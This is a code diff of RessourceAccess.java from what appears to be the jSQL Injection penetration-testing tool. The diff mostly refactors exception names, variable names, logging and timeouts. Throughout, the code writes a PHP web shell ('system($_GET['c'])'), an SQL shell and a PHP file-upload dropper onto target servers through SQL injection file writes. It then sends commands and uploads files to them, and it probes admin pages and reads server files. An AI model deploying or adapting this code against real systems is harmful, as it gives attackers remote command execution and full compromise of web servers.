@@ -39,8 +39,8 @@ import org.apache.log4j.Logger;
 import com.jsql.model.InjectionModel;
 import com.jsql.model.MediatorModel;
 import com.jsql.model.bean.util.Request;
-import com.jsql.model.exception.PreparationException;
-import com.jsql.model.exception.StoppableException;
+import com.jsql.model.exception.InjectionFailureException;
+import com.jsql.model.exception.StoppedByUserException;
 import com.jsql.model.injection.method.MethodInjection;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.ConnectionUtil;
@@ -100,8 +100,9 @@ public class RessourceAccess {
      * Check if every page in the list responds 200 OK.
      * @param urlInjection
      * @param pageNames List of admin pages ot test
+     * @throws InterruptedException 
      */
-    public static void createAdminPages(String urlInjection, List<ListItem> pageNames) {
+    public static void createAdminPages(String urlInjection, List<ListItem> pageNames) throws InterruptedException {
         String urlWithoutProtocol = urlInjection.replaceAll("^https?://[^/]*", "");
         String urlProtocol = urlInjection.replace(urlWithoutProtocol, "");
         String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "");
@@ -144,16 +145,12 @@ public class RessourceAccess {
                     nbAdminPagesFound++;
                 }
             } catch (InterruptedException | ExecutionException e) {
-                LOGGER.error(e, e);
+                LOGGER.error("Interruption while checking Admin pages", e);
             }
         }
 
         taskExecutor.shutdown();
-        try {
-            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
-        } catch (InterruptedException e) {
-            LOGGER.error(e, e);
-        }
+        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
 
         RessourceAccess.isSearchAdminStopped = false;
 
@@ -172,10 +169,10 @@ public class RessourceAccess {
      * Create a webshell in the server.
      * @param pathShell Remote path othe file
      * @param url
-     * @throws PreparationException
-     * @throws StoppableException
+     * @throws InjectionFailureException
+     * @throws StoppedByUserException
      */
-    public static void createWebShell(String pathShell, String urlShell) throws PreparationException, StoppableException {
+    public static void createWebShell(String pathShell, String urlShell) throws InjectionFailureException, StoppedByUserException {
         if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
@@ -189,7 +186,7 @@ public class RessourceAccess {
         );
 
         String[] sourcePage = {""};
-        String hexResult = new SuspendableGetRows().run(
+        String resultInjection = new SuspendableGetRows().run(
             MediatorModel.model().vendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_WEBSHELL),
             sourcePage,
             false,
@@ -197,23 +194,25 @@ public class RessourceAccess {
             null
         );
 
-        if ("".equals(hexResult)) {
+        if ("".equals(resultInjection)) {
             MediatorModel.model().sendResponseFromSite("Can't find web shell at "+ pathShellFixed + FILENAME_WEBSHELL, sourcePage[0].trim());
             return;
         }
 
         String url = urlShell;
         if ("".equals(url)) {
-            url = ConnectionUtil.urlByUser.substring(0, ConnectionUtil.urlByUser.lastIndexOf('/') + 1);
+            url = ConnectionUtil.urlBase.substring(0, ConnectionUtil.urlBase.lastIndexOf('/') + 1);
         }
 
-        if (hexResult.indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
+        if (resultInjection.indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
+            LOGGER.info("Web shell payload sent at "+ pathShellFixed + FILENAME_WEBSHELL);
+            
             Request request = new Request();
             request.setMessage("CreateShellTab");
             request.setParameters(pathShellFixed, url);
             MediatorModel.model().sendToViews(request);
         } else {
-            LOGGER.warn("Web shell not usable.");
+            LOGGER.warn("Web shell creation failed");
         }
     }
     
@@ -229,8 +228,8 @@ public class RessourceAccess {
         try {
             String url = urlShell + FILENAME_WEBSHELL + "?c=" + URLEncoder.encode(command.trim(), "ISO-8859-1");
             connection = new URL(url).openConnection();
-            connection.setReadTimeout(60000);
-            connection.setConnectTimeout(60000);
+            connection.setReadTimeout(ConnectionUtil.timeOut);
+            connection.setConnectTimeout(ConnectionUtil.timeOut);
 
             BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
             String line, pageSource = "";
@@ -245,9 +244,9 @@ public class RessourceAccess {
             // IllegalStateException #1544: catch incorrect execution
             try {
                 result = regexSearch.group(1);
-            } catch (IllegalStateException err) {
+            } catch (IllegalStateException e) {
                 result = "";
-                LOGGER.warn("Incorrect response from shell.");
+                LOGGER.warn("Incorrect response from Web shell");
             }
             
             Map<String, Object> msgHeader = new HashMap<>();
@@ -255,6 +254,7 @@ public class RessourceAccess {
             msgHeader.put("Post", "");
             msgHeader.put("Header", "");
             msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
+            msgHeader.put("Source", pageSource);
             
             Request request = new Request();
             request.setMessage("MessageHeader");
@@ -277,10 +277,10 @@ public class RessourceAccess {
      * @param url URL for the script (used for url rewriting)
      * @param username User name for current database
      * @param password User password for current database
-     * @throws PreparationException
-     * @throws StoppableException
+     * @throws InjectionFailureException
+     * @throws StoppedByUserException
      */
-    public static void createSqlShell(String pathShell, String urlShell, String username, String password) throws PreparationException, StoppableException {
+    public static void createSqlShell(String pathShell, String urlShell, String username, String password) throws InjectionFailureException, StoppedByUserException {
         if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
@@ -305,7 +305,7 @@ public class RessourceAccess {
         );
 
         String[] sourcePage = {""};
-        String hexResult = new SuspendableGetRows().run(
+        String resultInjection = new SuspendableGetRows().run(
             MediatorModel.model().vendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_SQLSHELL),
             sourcePage,
             false,
@@ -313,23 +313,25 @@ public class RessourceAccess {
             null
         );
 
-        if ("".equals(hexResult)) {
+        if ("".equals(resultInjection)) {
             MediatorModel.model().sendResponseFromSite("Can't find SQL shell at " + pathShellFixed + FILENAME_SQLSHELL, sourcePage[0].trim());
             return;
         }
         
         String url = urlShell;
         if ("".equals(url)) {
-            url = ConnectionUtil.urlByUser.substring(0, ConnectionUtil.urlByUser.lastIndexOf('/') + 1);
+            url = ConnectionUtil.urlBase.substring(0, ConnectionUtil.urlBase.lastIndexOf('/') + 1);
         }
 
-        if (hexResult.indexOf(s) > -1) {
+        if (resultInjection.indexOf(s) > -1) {
+            LOGGER.info("SQL shell payload sent at "+ pathShellFixed + FILENAME_SQLSHELL);
+            
             Request request = new Request();
             request.setMessage("CreateSQLShellTab");
             request.setParameters(pathShellFixed, url, username, password);
             MediatorModel.model().sendToViews(request);
         } else {
-            LOGGER.warn("SQL shell not usable.");
+            LOGGER.warn("SQL shell creation failed");
         }
     }
 
@@ -347,8 +349,8 @@ public class RessourceAccess {
         try {
             String url = urlShell + FILENAME_SQLSHELL +"?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password;
             connection = new URL(url).openConnection();
-            connection.setReadTimeout(60000);
-            connection.setConnectTimeout(60000);
+            connection.setReadTimeout(ConnectionUtil.timeOut);
+            connection.setConnectTimeout(ConnectionUtil.timeOut);
 
             BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
             String line, pageSource = "";
@@ -363,9 +365,9 @@ public class RessourceAccess {
             // IllegalStateException #1544: catch incorrect execution
             try {
                 result = regexSearch.group(1);
-            } catch (IllegalStateException err) {
+            } catch (IllegalStateException e) {
                 result = "";
-                LOGGER.warn("Incorrect response from shell.");
+                LOGGER.warn("Incorrect response from SQL shell");
             }
             
             Map<String, Object> msgHeader = new HashMap<>();
@@ -373,6 +375,7 @@ public class RessourceAccess {
             msgHeader.put("Post", "");
             msgHeader.put("Header", "");
             msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
+            msgHeader.put("Source", pageSource);
             
             Request request = new Request();
             request.setMessage("MessageHeader");
@@ -394,129 +397,126 @@ public class RessourceAccess {
      * @param pathFile Remote path of the file to upload
      * @param url URL of uploaded file
      * @param file File to upload
-     * @throws PreparationException
-     * @throws StoppableException
+     * @throws InjectionFailureException
+     * @throws StoppedByUserException
+     * @throws IOException 
      */
-    public static void uploadFile(String pathFile, String urlFile, File file) throws PreparationException, StoppableException {
+    public static void uploadFile(String pathFile, String urlFile, File file) throws InjectionFailureException, StoppedByUserException, IOException {
         if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
         
-        String phpShell = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
+        String phpShellToInject = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
 
-        String pathFileFixed = pathFile;
-        if (!pathFileFixed.matches(".*/$")) {
-            pathFileFixed += "/";
+        String pathPhpShellFixed = pathFile;
+        if (!pathPhpShellFixed.matches(".*/$")) {
+            pathPhpShellFixed += "/";
         }
         
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().vendor.getValue().getSqlTextIntoFile("<SQLi>"+ phpShell +"<iLQS>", pathFileFixed + FILENAME_UPLOAD)
+            MediatorModel.model().vendor.getValue().getSqlTextIntoFile("<SQLi>"+ phpShellToInject +"<iLQS>", pathPhpShellFixed + FILENAME_UPLOAD)
         );
 
-        String[] sourcePage = {""};
-        String hexResult = new SuspendableGetRows().run(
-            MediatorModel.model().vendor.getValue().getSqlReadFile(pathFileFixed + FILENAME_UPLOAD),
-            sourcePage,
+        String[] sourcePagePhpShell = {""};
+        String phpShellInjected = new SuspendableGetRows().run(
+            MediatorModel.model().vendor.getValue().getSqlReadFile(pathPhpShellFixed + FILENAME_UPLOAD),
+            sourcePagePhpShell,
             false,
             1,
             null
         );
 
-        if ("".equals(hexResult)) {
-            MediatorModel.model().sendResponseFromSite("Can't find upload file at "+ pathFileFixed + FILENAME_UPLOAD, sourcePage[0].trim());
+        if ("".equals(phpShellInjected)) {
+            MediatorModel.model().sendResponseFromSite("Can't find upload file at "+ pathPhpShellFixed + FILENAME_UPLOAD, sourcePagePhpShell[0].trim());
             return;
+        } else {
+            LOGGER.info("Upload payload sent at "+ pathPhpShellFixed + FILENAME_UPLOAD);
         }
 
-        String url = urlFile;
-        if ("".equals(url)) {
-            url = ConnectionUtil.urlByUser.substring(0, ConnectionUtil.urlByUser.lastIndexOf('/') + 1);
+        String urlFileFixed = urlFile;
+        if ("".equals(urlFileFixed)) {
+            urlFileFixed = ConnectionUtil.urlBase.substring(0, ConnectionUtil.urlBase.lastIndexOf('/') + 1);
         }
 
-        if (hexResult.indexOf(phpShell) > -1) {
+        if (phpShellInjected.indexOf(phpShellToInject) > -1) {
             String crLf = "\r\n";
-            URLConnection conn = null;
-            OutputStream os = null;
-            InputStream is = null;
+            
+            URLConnection connection = null;
+            URL urlUploadShell = new URL(urlFileFixed +"/"+ FILENAME_UPLOAD);
+            connection = urlUploadShell.openConnection();
+            connection.setDoOutput(true);
+            
+            try (
+                InputStream streamToUpload = new FileInputStream(file);
+            ) {
 
-            try (InputStream imgIs = new FileInputStream(file)) {
-                URL url2 = new URL(url +"/"+ FILENAME_UPLOAD);
-                conn = url2.openConnection();
-                conn.setDoOutput(true);
-
-                byte[] imgData = new byte[imgIs.available()];
-                imgIs.read(imgData);
+                byte[] streamData = new byte[streamToUpload.available()];
+                streamToUpload.read(streamData);
                 
-                String message1 = "";
-                message1 += "-----------------------------4664151417711" + crLf;
-                message1 += "Content-Disposition: form-data; name=\"u\"; filename=\"" + file.getName() +"\""+ crLf;
-                message1 += "Content-Type: binary/octet-stream" + crLf;
-                message1 += crLf;
+                String headerForm = "";
+                headerForm += "-----------------------------4664151417711" + crLf;
+                headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\"" + file.getName() +"\""+ crLf;
+                headerForm += "Content-Type: binary/octet-stream" + crLf;
+                headerForm += crLf;
 
-                String message2 = "";
-                message2 += crLf + "-----------------------------4664151417711--" + crLf;
+                String headerFile = "";
+                headerFile += crLf + "-----------------------------4664151417711--" + crLf;
 
-                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
-                conn.setRequestProperty("Content-Length", String.valueOf(message1.length() + message2.length() + imgData.length));
+                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
+                connection.setRequestProperty("Content-Length", String.valueOf(headerForm.length() + headerFile.length() + streamData.length));
 
-                os = conn.getOutputStream();
-                os.write(message1.getBytes());
-
-                int index = 0;
-                int size = 1024;
-                do {
-                    if (index + size > imgData.length) {
-                        size = imgData.length - index;
-                    }
-                    os.write(imgData, index, size);
-                    index += size;
-                } while (index < imgData.length);
-
-                os.write(message2.getBytes());
-                os.flush();
-
-                is = conn.getInputStream();
-
-                char buff = 512;
-                int len;
-                byte[] data = new byte[buff];
-                String result = "";
-                do {
-                    len = is.read(data);
-
-                    if (len > 0) {
-                        result += new String(data, 0, len);
-                    }
-                } while (len > 0);
-
-                if (result.indexOf("SQLiy") > -1) {
-                    LOGGER.debug("Upload successful.");
-                } else {
-                    LOGGER.warn("Upload failed.");
+                try (
+                    OutputStream streamOutputFile = connection.getOutputStream();
+                ) {
+                    streamOutputFile.write(headerForm.getBytes());
+    
+                    int index = 0;
+                    int size = 1024;
+                    do {
+                        if (index + size > streamData.length) {
+                            size = streamData.length - index;
+                        }
+                        streamOutputFile.write(streamData, index, size);
+                        index += size;
+                    } while (index < streamData.length);
+    
+                    streamOutputFile.write(headerFile.getBytes());
+                    streamOutputFile.flush();
                 }
                 
-                Map<String, Object> msgHeader = new HashMap<>();
-                msgHeader.put("Url", url);
-                msgHeader.put("Post", "");
-                msgHeader.put("Header", "");
-                msgHeader.put("Response", StringUtil.getHTTPHeaders(conn));
-
-                Request request = new Request();
-                request.setMessage("MessageHeader");
-                request.setParameters(msgHeader);
-                MediatorModel.model().sendToViews(request);
-            } catch (Exception e) {
-                LOGGER.error(e, e);
-            } finally {
-                try {
-                    os.close();
-                } catch (Exception e) {
-                    LOGGER.error(e, e);
-                }
-                try {
-                    is.close();
-                } catch (Exception e) {
-                    LOGGER.error(e, e);
-                }
+                try (
+                    InputStream streamInputFile = connection.getInputStream();
+                ) {
+                    char buff = 512;
+                    int len;
+                    byte[] data = new byte[buff];
+                    String result = "";
+                    do {
+                        len = streamInputFile.read(data);
+    
+                        if (len > 0) {
+                            result += new String(data, 0, len);
+                        }
+                    } while (len > 0);
+    
+                    if (result.indexOf("SQLiy") > -1) {
+                        LOGGER.debug("Upload successful.");
+                    } else {
+                        LOGGER.warn("Upload failed.");
+                    }
+                    
+                    Map<String, Object> msgHeader = new HashMap<>();
+                    msgHeader.put("Url", urlFileFixed);
+                    msgHeader.put("Post", "");
+                    msgHeader.put("Header", "");
+                    msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
+                    msgHeader.put("Source", result);
+    
+                    Request request = new Request();
+                    request.setMessage("MessageHeader");
+                    request.setParameters(msgHeader);
+                    MediatorModel.model().sendToViews(request);
+                } 
             }
         } else {
             LOGGER.warn("Upload not usable.");
@@ -530,13 +530,13 @@ public class RessourceAccess {
     /**
      * Check if current user can read files.
      * @return True if user can read file, false otherwise
-     * @throws PreparationException
-     * @throws StoppableException
+     * @throws InjectionFailureException
+     * @throws StoppedByUserException
      */
-    public static boolean isReadingAllowed() throws PreparationException, StoppableException {
+    public static boolean isReadingAllowed() throws InjectionFailureException, StoppedByUserException {
         String[] sourcePage = {""};
 
-        String hexResult = new SuspendableGetRows().run(
+        String resultInjection = new SuspendableGetRows().run(
             MediatorModel.model().vendor.getValue().getSqlPrivilegeCheck(),
             sourcePage,
             false,
@@ -544,13 +544,13 @@ public class RessourceAccess {
             null
         );
 
-        if ("".equals(hexResult)) {
+        if ("".equals(resultInjection)) {
             MediatorModel.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
             MediatorModel.model().sendToViews(request);
             readingIsAllowed = false;
-        } else if ("false".equals(hexResult)) {
+        } else if ("false".equals(resultInjection)) {
             LOGGER.warn("No FILE privilege");
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
@@ -569,15 +569,19 @@ public class RessourceAccess {
     /**
      * Create a panel for each file in the list.
      * @param pathsFiles List of file to read
-     * @throws PreparationException
-     * @throws StoppableException
+     * @throws InjectionFailureException
+     * @throws StoppedByUserException
+     * @throws InterruptedException 
+     * @throws ExecutionException 
      */
-    public static void readFile(List<ListItem> pathsFiles) throws PreparationException, StoppableException {
-        if (!isReadingAllowed()) {
+    public static void readFile(List<ListItem> pathsFiles)
+        throws InjectionFailureException, StoppedByUserException, InterruptedException 
+    {
+        if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
 
-        int nb = 0;
+        int countFileFound = 0;
         ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
         CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
 
@@ -587,48 +591,51 @@ public class RessourceAccess {
 
         List<String> duplicate = new ArrayList<>();
         int submittedTasks = pathsFiles.size();
-        for (int tasksHandled = 0; tasksHandled < submittedTasks && !RessourceAccess.isSearchFileStopped; tasksHandled++) {
-            try {
-                CallableFile currentCallable = taskCompletionService.take().get();
-                if (!"".equals(currentCallable.getFileSource())) {
-                    String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
-                    String content = currentCallable.getFileSource();
-                    String path = currentCallable.getUrl();
-
-                    Request request = new Request();
-                    request.setMessage("CreateFileTab");
-                    request.setParameters(name, content, path);
-                    MediatorModel.model().sendToViews(request);
-
-                    if (!duplicate.contains(path.replace(name, ""))) {
-                        LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
-                    }
-                    duplicate.add(path.replace(name, ""));
-
-                    nb++;
-                }
-            } catch (InterruptedException | ExecutionException e) {
-                LOGGER.error(e, e);
-            }
-        }
-
-        taskExecutor.shutdown();
+        
         try {
+            for (int tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
+                try {
+                    CallableFile currentCallable = taskCompletionService.take().get();
+                    if (!"".equals(currentCallable.getFileSource())) {
+                        String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
+                        String content = currentCallable.getFileSource();
+                        String path = currentCallable.getUrl();
+        
+                        Request request = new Request();
+                        request.setMessage("CreateFileTab");
+                        request.setParameters(name, content, path);
+                        MediatorModel.model().sendToViews(request);
+        
+                        if (!duplicate.contains(path.replace(name, ""))) {
+                            LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
+                        }
+                        duplicate.add(path.replace(name, ""));
+        
+                        countFileFound++;
+                    }
+                    
+                    if (RessourceAccess.isSearchFileStopped) {
+                        throw new StoppedByUserException();
+                    }
+                } catch (ExecutionException e) {
+                    // File not found, probably
+                }
+            }
+        } finally {
+            taskExecutor.shutdown();
             taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
-        } catch (InterruptedException e) {
-            LOGGER.error(e, e);
+            
+            RessourceAccess.isSearchFileStopped = false;
+            
+            if (countFileFound > 0) {
+                LOGGER.debug("File(s) found: " + countFileFound + "/" + submittedTasks);
+            } else {
+                LOGGER.trace("File(s) found: " + countFileFound + "/" + submittedTasks);
+            }
+            Request request = new Request();
+            request.setMessage("EndFileSearch");
+            MediatorModel.model().sendToViews(request);
         }
-
-        RessourceAccess.isSearchFileStopped = false;
-
-        if (nb > 0) {
-            LOGGER.debug("File(s) found: " + nb + "/" + submittedTasks);
-        } else {
-            LOGGER.trace("File(s) found: " + nb + "/" + submittedTasks);
-        }
-        Request request = new Request();
-        request.setMessage("EndFileSearch");
-        MediatorModel.model().sendToViews(request);
     }
     
     public static void scanList(List<ListItem> urlList) {
@@ -641,28 +648,35 @@ public class RessourceAccess {
         try {
             Thread.sleep(500);
         } catch (InterruptedException e) {
-            // do nothing
+            LOGGER.error("Interruption while sleeping during scan", e);
+            Thread.currentThread().interrupt();
         }
 
+        // Display result only in console
         MediatorModel.model().deleteObservers();
-        
-        // Display result in console (view definition in model #TODO)
-        new ScanListTerminal();
+        MediatorModel.model().addObserver(new ScanListTerminal());
         
         MediatorModel.model().isScanning = true;
+        RessourceAccess.isScanStopped = false;
         
         for (ListItem url: urlList) {
+            if (MediatorModel.model().isStoppedByUser() || RessourceAccess.isScanStopped) {
+                break;
+            }
             LOGGER.info("Scanning " + url);
             MediatorModel.model().controlInput(url.toString(), "", "", MethodInjection.QUERY, "POST", true);
             
             try {
                 Thread.sleep(500);
             } catch (InterruptedException e) {
-                // nothing
+                LOGGER.error("Interruption while sleeping between two scans", e);
+                Thread.currentThread().interrupt();
             }
         }
         
         MediatorModel.model().isScanning = false;
+        MediatorModel.model().setIsStoppedByUser(false);
+        RessourceAccess.isScanStopped = false;
 
         Request request = new Request();
         request.setMessage("EndScanList");
